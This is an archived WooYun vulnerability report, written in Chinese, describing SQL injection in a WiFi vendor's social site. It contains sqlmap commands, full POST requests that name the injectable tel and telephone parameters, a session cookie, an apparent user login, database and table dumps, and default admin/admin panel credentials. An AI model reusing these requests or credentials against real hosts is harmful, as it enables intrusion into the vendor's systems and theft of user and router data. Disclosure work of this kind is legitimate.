{"id": 88197, "wybug_id": "wooyun-2016-0208336", "wybug_title": "wifi安全之ALLWIFISQL打包dba权限垮库查询（影响2w8千多路由/可修改app信息）                                      ", "wybug_corp": "all-wifi.cn", "wybug_author": "黑色键盘丶", "wybug_date": "2016-05-14 09:38", "wybug_open_date": "2016-06-28 19:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-28：\t细节向公众公开  简要描述： RT 详细说明：  \nsqlmap语法：sqlmap.py -r 1.txt --dbs----------------------------tel参数-----post数据包------------------POST /index.php/Contacts/add HTTP/1.1Host: social.all-wifi.cnProxy-Connection: keep-aliveContent-Length: 85Accept: application/json, text/javascript, */*; q=0.01Origin: http://social.all-wifi.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://social.all-wifi.cn/index.php/Contacts/contactsAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=0mu3236cmhmmcv3gtas3r790e5tel=111&type=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%B9%E6%96%B9%E6%89%8B%E6%9C%BA%E5%8F%B7------------------------------------------------sqlmap语法:sqlmap.py -r 2.txt --dbs-----------------------------------post数据包----telephone参数POST /index.php/Login/login HTTP/1.1Host: social.all-wifi.cnProxy-Connection: keep-aliveContent-Length: 37Accept: application/json, text/javascript, */*; q=0.01Origin: http://social.all-wifi.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://social.all-wifi.cn/index.php/Login/loginAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=0mu3236cmhmmcv3gtas3r790e5telephone=13656785601&password=qwe123\n\n数据库信息\n\nmask 区域\n\n*****MS: My**********atabas**********allw**********allw**********iji**********acti**********_coll**********tion_s**********ing**********ysq**********ance_s**********ort**********xyal**********zjk**********hej**********oci**********est**********ifi**********llwi**********llwif**********oqing**********x_y**********xdl**********xgw**********xzf*****\n\n\n\n\n当前库表信息\nDatabase: social\n\nmask 区域\n\n*****----+--**********    | E**********----+--**********    | 2**********    | 5**********    | 3**********n   | 2**********    | 1**********    | 8**********    | 6**********    | 5**********    | 4**********opy | 3**********    | 1**********    | 1**********----+--*****\n\n\n\n\n\n垮裤查询Database: wifi  这里的百万好像是access point什么的 几百万\n\nmask 区域\n\n*****----+---**********    | En**********----+---**********    | 24**********    | 48**********    | 28**********    | 27**********    | 34**********    | 34**********    | 10**********    | 10**********    | 29**********    | 70**********    | 70**********    | 54**********    | 32**********    | 24**********    | 13**********    | 12**********    | 11**********_ad | 7 **********e   | 4 **********    | 3 **********r   | 3 **********    | 2 **********    | 2 **********ers | 1 **********    | 1 **********el  | 1 **********------+*****\n\n\n\n\n\n2w8千路由信息 dump看了几条下农业银行的路由\n\n\n\nhttp://xx.all-wifi.cn/admin/default.php admin admin 进入\n可对app进行修改\n\n\n\n   漏洞证明：  \nsqlmap语法：sqlmap.py -r 1.txt --dbs----------------------------tel参数-----post数据包------------------POST /index.php/Contacts/add HTTP/1.1Host: social.all-wifi.cnProxy-Connection: keep-aliveContent-Length: 85Accept: application/json, text/javascript, */*; q=0.01Origin: http://social.all-wifi.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://social.all-wifi.cn/index.php/Contacts/contactsAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=0mu3236cmhmmcv3gtas3r790e5tel=111&type=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%B9%E6%96%B9%E6%89%8B%E6%9C%BA%E5%8F%B7------------------------------------------------sqlmap语法:sqlmap.py -r 2.txt --dbs-----------------------------------post数据包----telephone参数POST /index.php/Login/login HTTP/1.1Host: social.all-wifi.cnProxy-Connection: keep-aliveContent-Length: 37Accept: application/json, text/javascript, */*; q=0.01Origin: http://social.all-wifi.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://social.all-wifi.cn/index.php/Login/loginAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=0mu3236cmhmmcv3gtas3r790e5telephone=13656785601&password=qwe123\n\n数据库信息back-end DBMS: MySQL 5.0available databases [23]:[*] actallwifi[*] appallwificn[*] dijiuqu[*] gy_activity[*] ik_ap_collect[*] information_schema[*] jingcai[*] mysql[*] performance_schema[*] portal[*] proxyallwifi[*] qzjkd[*] shejiao[*] social[*] test[*] wifi[*] wxallwificn[*] xx98allwificn[*] xx_yaoqinghan[*] xx_yjhx[*] xxdl[*] xxgw[*] xxzfproxy\n当前库表信息\nDatabase: social+----------------+---------+| Table          | Entries |+----------------+---------+| tp_apinfo      | 24101   || request        | 55      || msg            | 30      || verification   | 23      || userinfo       | 11      || groupmember    | 8       || `group`        | 6       || friends        | 5       || friend         | 4       || ns_online_copy | 3       || `user`         | 1       || admin          | 1       |+----------------+---------+\n\n垮裤查询Database: wifi  这里的百万好像是access point什么的 几百万+------------------+---------+| Table            | Entries |+------------------+---------+| wifi_adrecode    | 24421932 || wifi_adcount     | 4858467 || apinfo           | 28382   || wifi_routemap    | 27577   || shopinfo         | 3440    || wifi_shop        | 3440    || wifi_member      | 1002    || ns_user          | 1000    || wifi_authlist    | 294     || wifi_access      | 70      || wifi_treenode    | 70      || wifi_ad          | 54      || wifi_day         | 32      || wifi_hours       | 24      || wifi_waptpl      | 13      || wifi_month       | 12      || wifi_trade       | 11      || wifi_routemap_ad | 7       || wifi_advertise   | 4       || wifi_admin       | 3       || wifi_role_user   | 3       || wifi_authtpl     | 2       || wifi_role        | 2       || wifi_advertisers | 1       || wifi_agent       | 1       || wifi_agentlevel  | 1       |+------------------+---------+\n\n2w8千路由信息 dump看了几条下农业银行的路由\n\n\n\nhttp://xx.all-wifi.cn/admin/default.php admin admin 进入\n可对app进行修改\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 黑色键盘丶@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-05-14 18:55 厂商回复： 谢谢，正在修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-14 09:49 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  666    \n     2016-05-15 09:00 |    \t\t放逐 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 白帽子放逐Gg？得失乐与悲与Av Qq205655539)\t\t \n  666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}